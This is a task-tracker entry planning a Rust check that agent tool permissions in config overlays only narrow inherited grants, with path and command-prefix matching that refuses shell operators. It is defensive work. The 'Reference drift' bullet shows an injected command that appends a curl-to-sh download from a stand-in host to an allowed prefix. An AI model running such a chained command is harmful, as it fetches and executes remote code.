---
id: TASK-55.5.6
title: 'R4.6: Tool narrowing'
status: In Progress
assignee:
  - '@implementer'
created_date: '2026-11-23T12:27:00Z'
updated_date: '2026-11-23T13:26:00Z'
labels:
  - area:rust
  - area:merge
  - area:security
milestone: m-7
dependencies:
  - TASK-55.5.5
  - TASK-55.5.1
parent_task_id: TASK-55.5
priority: high
type: task
ordinal: 119390
---

## Description

<!-- SECTION:DESCRIPTION:BEGIN -->
Plan for this step (§7.2 narrowing rule as R4.1 writes it; owner answer 6 in TASK-55.5).
- ToolGrant { tool: NeutralTool, scope: Option<ToolScope> }, NeutralTool the closed neutral vocabulary (an unknown tool is an `agent` error). ToolScope = Path for read, write, edit, grep, glob and notebook_edit | Command for bash | Other for every other tool.
- covers(base, candidate): the same tool, and one of: the base has no scope; the scopes are equal; a Path base whose last segment is `**` and a candidate whose segments start with the base's other segments, compared whole and as written, with no `.` or `..` segment in the candidate (`docs/**` covers `docs/adr/**` and `docs/a.md`, never `docs-private/a.md`); a Command base that ends in `*` and a candidate that starts with the base's text before its trailing `*`s, where the rest of the candidate holds none of the shell operators `;` `&` `|` `<` `>` `(` `)`, a backtick, a line feed or a carriage return. Any other wildcard covers only an equal scope.
- After an overlay's tools edit, every grant must be covered by a grant of the base, unless the overlay sets allow_widen and its layer is not public; allow_widen in a public layer is a `tool-widen` error. The error names the agent, the layer and the widened entry, stripped (decision-26).
- Reference drift, described in the open as the owner asked: the TypeScript reference (src/merge/tools.ts, `covers`) treats any scope that ends in `*` as covering every candidate that starts with the scope's text before the stars. So `write:docs*` covers `write:docs-private/**`, and `bash:mise run *` covers `bash:mise run test; curl https://example.invalid/x | sh`. An overlay can therefore widen an inherited grant while the build accepts it as narrowing. The Rust alz refuses both; the acceptance cases for them are marked referenceDrift (decision-30).
<!-- SECTION:DESCRIPTION:END -->

## Acceptance Criteria
<!-- AC:BEGIN -->
- [ ] #1 Test 04's cases have Rust tests with the same verdict: an overlay that adds a tool fails naming the agent, the tool and the layer, and one that removes a tool or narrows a scope passes (unit tests)
- [ ] #2 A table test shows the containment rule: docs/** covers docs/adr/** and docs/a.md, neither docs* nor docs/** covers docs-private/a.md, and mise run * covers mise run test but not mise run a; b, mise run a && b, mise run a | b, mise run $(a) or mise run a > f
- [ ] #3 Proptest: covers is reflexive and transitive, and without allow_widen in a non-public layer every merged grant is covered by a base grant; allow_widen is refused in a public layer and lets a private layer's overlay add a tool (unit tests)
- [ ] #4 Test 04 gains referenceDrift cases (task TASK-55.5.6) for an overlay that widens through a trailing-star path scope and one that adds a shell operator to a command scope; both fail on the TypeScript reference and pass on the Rust binary by R5 (mise run test:acceptance)
<!-- AC:END -->
